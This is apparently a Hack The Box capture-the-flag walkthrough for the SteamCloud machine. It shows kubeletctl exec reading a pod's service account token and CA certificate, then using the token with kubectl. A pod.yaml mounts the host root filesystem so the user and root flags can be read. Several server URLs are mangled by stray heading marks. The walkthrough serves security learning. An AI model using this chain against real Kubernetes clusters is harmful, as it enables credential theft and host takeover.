
Look up tokens 
````
kubeletctl --server steamcloud.htb exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20tokke.png)

##  Look up certs
````
kubeletctl --server steamcloud.htb exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx

`````

With this info login to Kubectl

##  Export togen --> make token an environmental variable
```
export token="tokenreceived"
````

##  login to Kubectl
````
kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.11.133:8443 get pods


`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20list%20listening%20pods.png)

##  list allowed commands
````
kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.11.133:8443 auth can-i --list

`````

commands get, create and list are allowed
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/Kubelet%20list%20allowed%20commands.png)

##  Create pod in the default namespace with yaml config file:
##  pod.yaml
````
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true


`````


![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/yaml%20configuration%20file%20for%20Kubelet.png)

##  Kubelets apply custom pod.yaml file
````
kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.11.133:8443 apply -f pod.yaml

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubectl%20apply%20yaml%20file.png)

##  list listening/open pods
````
kubectl --token=$token --certificate-authority=ca.crt --server=https:##  10.10.11.133:8443 get pods

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubectl%20list%20open%20pods.png)

##  read user.txt
````
kubeletctl --server 10.10.11.133 exec "cat /root/home/user/user.txt" -p nginxt -c nginxt

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubeletctl%20read%20user.txt.png)

##  read root.txt
````
kubeletctl --server 10.10.11.133 exec "cat /root/root/root.txt" -p nginxt -c nginxt

`````

![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/SteamCloud/screenshots/kubeletctl%20read%20root.txt.png)


XXXXXXXXXXXXXXXX